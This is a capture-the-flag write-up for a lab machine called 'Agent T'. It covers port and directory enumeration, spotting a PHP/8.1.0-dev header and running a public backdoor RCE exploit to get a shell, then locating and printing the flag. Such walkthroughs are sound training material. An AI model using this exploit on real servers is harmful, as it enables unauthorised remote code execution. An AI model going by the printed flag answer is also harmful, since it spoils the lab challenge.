# Agent T

Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds.

---

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

Only one port is open, so let’s enumerate it with dirsearch.

---

## Dirsearch

```bash
dirsearch -u http://agent.thm -e * -t 50
```

```
200 -  /.travis.yml
200 -  /404.html
200 -  /gulpfile.js
200 -  /package.json
200 -  /package-lock.json
```

<img width="1857" height="980" alt="Screenshot From 2025-09-04 19-18-49" src="https://github.com/user-attachments/assets/bb260b5b-9d20-4a68-9932-1cdc53a3fe88" />

---

## Web Enumeration

Viewing the source code gave nothing. Heading to **Pages**, we got a 404 page with a link saying:

```
Not Found
The requested resource /index.html was not found on this server.
```

Nothing obvious stood out, so I checked the headers with `curl -I`:

```bash
curl -I http://agent.thm
```

```
HTTP/1.1 200 OK
Host: agent.thm
Date: Fri, 05 Sep 2025 00:08:15 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8
```

The server runs **PHP/8.1.0-dev**, which has a known RCE backdoor exploit.

---

## Exploit

Exploit link:
[https://github.com/flast101/php-8.1.0-dev-backdoor-rce](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)

I ran it directly:

```bash
python3 exploit.py
Enter the host url:
http://agent.thm
```

```
Interactive shell is opened on http://agent.thm 
Can't acces tty; job crontol turned off.
$ pwd
/var/www/html
```

I could not change folders cleanly, but I listed files:

```
404.html
blank.html
css
gulpfile.js
img
index.php
js
package-lock.json
package.json
scss
vendor
```

---

## Finding the Flag

To locate the flag, I ran:

```bash
find / -type f -name "*.txt" 2>/dev/null
```

Among the output, the key entry was:

```
/flag.txt
```

Reading it:

```bash
cat /flag.txt
```

```
flag{4127d0530abf16d6d23973e3df8dbecb}
```

---

## Flag

> Q1: Flag
> A1: flag{4127d0530abf16d6d23973e3df8dbecb}
